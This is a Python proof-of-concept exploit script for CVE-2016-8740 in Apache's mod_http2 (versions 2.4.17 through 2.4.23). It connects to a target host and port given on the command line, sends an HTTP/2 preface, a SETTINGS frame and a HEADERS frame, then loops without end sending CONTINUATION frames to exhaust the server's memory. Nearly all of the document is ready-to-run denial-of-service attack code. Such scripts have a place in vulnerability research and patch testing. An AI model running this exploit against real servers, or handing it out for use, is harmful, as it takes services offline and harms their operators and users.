#!/usr/bin/python

""" source : http://seclists.org/bugtraq/2016/Dec/3
The mod_http2 module in the Apache HTTP Server 2.4.17 through 2.4.23, when the Protocols configuration includes h2 or h2c, does not restrict request-header length, which allows remote attackers to cause a denial of service (memory consumption) via crafted CONTINUATION frames in an HTTP/2 request.(https://access.redhat.com/security/cve/cve-2016-8740)

Usage : cve-2016-8740.py [HOST] [PORT]
"""

import sys
import struct
import socket

HOST = sys.argv[1]
PORT = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# https://http2.github.io/http2-spec/#ConnectionHeader
s.sendall('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')

# https://http2.github.io/http2-spec/#SETTINGS
SETTINGS = struct.pack('3B', 0x00, 0x00, 0x00) # Length
SETTINGS += struct.pack('B', 0x04) # Type
SETTINGS += struct.pack('B', 0x00)
SETTINGS += struct.pack('>I', 0x00000000)
s.sendall(SETTINGS)

# https://http2.github.io/http2-spec/#HEADERS
HEADER_BLOCK_FRAME = '\x82\x84\x86\x41\x86\xa0\xe4\x1d\x13\x9d\x09\x7a\x88\x25\xb6\x50\xc3\xab\xb6\x15\xc1\x53\x03\x2a\x2f\x2a\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76'
HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:] # Length
HEADERS += struct.pack('B', 0x01) # Type
HEADERS += struct.pack('B', 0x00) # Flags
HEADERS += struct.pack('>I', 0x00000001) # Stream ID
s.sendall(HEADERS + HEADER_BLOCK_FRAME)

# Sending CONTINUATION frames for leaking memory
# https://http2.github.io/http2-spec/#CONTINUATION
while True:
    HEADER_BLOCK_FRAME = '\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76'
    HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:] # Length
    HEADERS += struct.pack('B', 0x09) # Type
    HEADERS += struct.pack('B', 0x01) # Flags
    HEADERS += struct.pack('>I', 0x00000001) # Stream ID
    s.sendall(HEADERS + HEADER_BLOCK_FRAME)
